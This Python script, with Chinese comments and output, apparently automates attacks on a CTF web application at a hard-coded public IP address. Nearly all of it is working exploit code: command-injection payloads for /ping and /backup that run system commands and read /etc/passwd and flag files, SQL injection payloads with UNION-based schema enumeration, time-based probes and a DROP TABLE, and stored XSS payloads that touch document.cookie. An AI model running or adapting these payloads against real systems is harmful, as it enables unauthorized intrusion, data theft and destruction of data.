import requests
import re
import json

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

session = requests.Session()
session.verify = False
session.headers.update(HEADERS)

FLAGS_FOUND = []


def add_flag(location, content, method=""):
    FLAGS_FOUND.append({"location": location, "content": content, "method": method})
    print(f"\n  🚩 发现FLAG! [{method}]")
    print(f"     位置: {location}")
    print(f"     内容: {content}")


def check_flag_pattern(text):
    patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def view_source():
    """查看上传源码"""
    print_section("1. 查看上传源码")
    
    url = f"{TARGET}/upload-source"
    try:
        r = session.get(url, timeout=TIMEOUT)
        print(f"  状态码: {r.status_code}")
        print(f"\n  源码内容:\n{r.text}")
        
        flag = check_flag_pattern(r.text)
        if flag:
            add_flag("/upload-source", flag, "源码中")
            
    except Exception as e:
        print(f"  错误: {e}")


def test_ping():
    """测试Ping命令执行"""
    print_section("2. Ping命令执行测试")
    
    url = f"{TARGET}/ping"
    
    ping_payloads = [
        "127.0.0.1",
        "127.0.0.1; ls",
        "127.0.0.1&&ls",
        "127.0.0.1|ls",
        "127.0.0.1||ls",
        ";ls",
        "&&ls",
        "|ls",
        "127.0.0.1; cat /flag",
        "127.0.0.1; type flag.txt",
        "127.0.0.1; dir",
        "127.0.0.1; whoami",
        "127.0.0.1; id",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1; find / -name flag*",
        "127.0.0.1; find / -name '*flag*'",
        "127.0.0.1; more /flag",
        "127.0.0.1; less /flag",
        "127.0.0.1; cat F:\\small\\ peoject\\python-lab\\flag.txt",
        "127.0.0.1; type F:\\small\\ peoject\\python-lab\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                # 检查是否有命令执行迹象
                indicators = ["root:", "flag", "uid=", "gid=", "bin", "usr", "DIRECTORY", "Volume in drive"]
                has_indicator = any(i in content for i in indicators)
                
                if has_indicator or len(content) > 1000:
                    print(f"\n  [{r.status_code}] ?host={payload}")
                    print(f"     响应: {content[:500]}")
                    
                    flag = check_flag_pattern(content)
                    if flag:
                        add_flag(f"Ping命令执行: {payload}", flag, "命令执行结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup():
    """测试Backup命令执行"""
    print_section("3. Backup命令执行测试")
    
    url = f"{TARGET}/backup"
    
    # 从页面看到默认路径是 F:\small peoject\python-lab\uploads
    backup_payloads = [
        "F:\\small peoject\\python-lab\\uploads",
        "F:\\small peoject\\python-lab",
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "/flag",
        "/flag.txt",
        "F:\\flag.txt",
        "F:\\flag",
        "F:\\small peoject\\python-lab\\uploads; ls",
        "F:\\small peoject\\python-lab\\uploads&&dir",
        "F:\\small peoject\\python-lab\\uploads|dir",
        "; dir",
        "&& dir",
        "| dir",
        "; cat /flag",
        "&& cat /flag",
        "| cat /flag",
        "`dir`",
        "$(dir)",
        "F:\\small peoject\\python-lab\\uploads; type F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; find F:\\ /name flag*",
        "F:\\small peoject\\python-lab\\uploads; whoami",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                indicators = ["root:", "flag", "uid=", "gid=", "bin", "usr", "DIRECTORY", "Volume in drive", "txt", "backup"]
                has_indicator = any(i in content for i in indicators)
                
                if has_indicator or len(content) > 500:
                    print(f"\n  [{r.status_code}] ?path={payload}")
                    print(f"     响应: {content[:500]}")
                    
                    flag = check_flag_pattern(content)
                    if flag:
                        add_flag(f"Backup命令执行: {payload}", flag, "命令执行结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_sql_injection():
    """测试SQL注入（基于提示：粗糙的关键字替换）"""
    print_section("4. SQL注入深度测试")
    
    url = f"{TARGET}/search"
    
    # 尝试绕过关键字替换
    sql_payloads = [
        "SQL",
        "sql",
        "sQL",
        "union select",
        "UNION SELECT",
        "uNioN sElEcT",
        "1' or 1=1",
        "1' OR 1=1",
        "1' or 1=1--",
        "1' OR '1'='1",
        "1' UNION SELECT 1,2,3",
        "1' UNION SELECT 1,version(),3",
        "1' UNION SELECT 1,database(),3",
        "1' UNION SELECT 1,(SELECT group_concat(table_name) FROM information_schema.tables),3",
        "1' UNION SELECT 1,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),3",
        "' OR 1=1",
        "\" OR 1=1",
        "' OR 'a'='a",
        "\" OR \"a\"=\"a",
        "admin' --",
        "admin'#",
        "1' AND SLEEP(2)",
        "1' AND BENCHMARK(1000000,MD5(1))",
        "1'; DROP TABLE users--",
        "1' OR 1=1/*",
        "1' UNION ALL SELECT 1,2,3",
        "1' UNION DISTINCT SELECT 1,2,3",
        "0' UNION SELECT 1,2,3",
        "0' OR 1=1",
        "-1' OR 1=1",
        "1' ORDER BY 1",
        "1' ORDER BY 2",
        "1' ORDER BY 3",
        "1' LIMIT 0,1",
        "1' OFFSET 1",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                # 检查SQL错误或数据泄露
                sql_errors = ["SQL syntax", "mysql", "MySQL", "database", "error", "Warning", "root", "admin"]
                has_error = any(e in content for e in sql_errors)
                
                if has_error or len(content) > 500:
                    print(f"\n  [{r.status_code}] ?q={payload}")
                    print(f"     响应: {content[:300]}")
                    
                    flag = check_flag_pattern(content)
                    if flag:
                        add_flag(f"SQL注入: {payload}", flag, "SQL查询结果")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_xss_stored():
    """测试存储型XSS"""
    print_section("5. 存储型XSS测试")
    
    url = f"{TARGET}/message"
    
    # 获取CSRF token
    try:
        r = session.get(url, timeout=TIMEOUT)
        csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
        csrf_token = csrf.group(1) if csrf else ""
        print(f"  CSRF Token: {csrf_token}")
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<a href=javascript:alert(1)>click</a>",
            "<div onmouseover=alert(1)>hover</div>",
            "\"><script>alert(1)</script>",
            "<script>console.log(document.cookie)</script>",
            "<script>console.log('test')</script>",
            "flag",
            "CTF",
            "<script>fetch('/flag').then(r=>r.text()).then(console.log)</script>",
        ]
        
        for payload in xss_payloads:
            try:
                data = {"csrf": csrf_token, "content": payload}
                r = session.post(url, data=data, timeout=TIMEOUT)
                
                if r.status_code in [200, 201]:
                    print(f"\n  [{r.status_code}] XSS: {payload[:50]}")
                    print(f"     响应: {r.text[:200]}")
                    
                    flag = check_flag_pattern(r.text)
                    if flag:
                        add_flag(f"XSS响应: {payload}", flag, "XSS响应")
                        
            except Exception as e:
                print(f"  错误: {e}")
                
    except Exception as e:
        print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    view_source()
    test_ping()
    test_backup()
    test_sql_injection()
    test_xss_stored()
    
    print_section("检测结果汇总")
    
    if FLAGS_FOUND:
        print(f"\n  🎉 共发现 {len(FLAGS_FOUND)} 个FLAG!")
        for i, flag_info in enumerate(FLAGS_FOUND):
            print(f"\n  [{i+1}] {flag_info['method']}")
            print(f"      位置: {flag_info['location']}")
            print(f"      FLAG: {flag_info['content']}")
    else:
        print("\n  ❌ 未发现FLAG")
        print("\n  已测试的模块:")
        print("     - /upload-source: 查看上传源码")
        print("     - /ping: 命令执行测试")
        print("     - /backup: 命令执行测试")
        print("     - /search: SQL注入测试")
        print("     - /message: 存储型XSS测试")
    
    print()


if __name__ == "__main__":
    main()